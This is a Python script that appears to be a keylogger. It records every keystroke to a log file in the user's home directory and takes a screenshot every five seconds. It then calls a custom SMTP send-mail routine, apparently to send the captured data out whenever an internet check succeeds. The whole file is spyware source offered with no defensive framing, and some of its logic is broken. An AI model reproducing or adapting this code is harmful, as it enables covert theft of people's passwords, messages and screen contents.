from pynput.keyboard import Key, Listener
import pyautogui
import pynput
import SMTP
import socket
import time
import os

count = 0
keys = []

directory = os.path.expanduser('~') + '/'


def on_press(key):
    global keys, count
    keys.append(key)
    count += 1
    if count >= 10:
        write_file(keys)
        keys = []


def write_file(keys):
    global directory
    filename = 'log.txt'
    files = directory + filename

    with open(files, 'a') as file:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                file.write("    ")

            elif k.find("Key") == -1:
                file.write(k)

            if k.find("enter") > 0:
                file.write("\n")


def connected():
    try:
        socket.create_connection(("www.google.com", 80))
        return True

    except OSError:
        pass
    return False


def main(key):
    on_press(key)


if __name__ == '__main__':
    with Listener(on_press=main) as Listener:
        while True:
            time.sleep(5)
            screen = pyautogui.screenshot(directory + 'screenshot.png')
            if connected():
                SMTP.SEND_MAIL()
            if not connected():
                pass
            os.remove(directory + 'screenshot.png')
        listener.join()
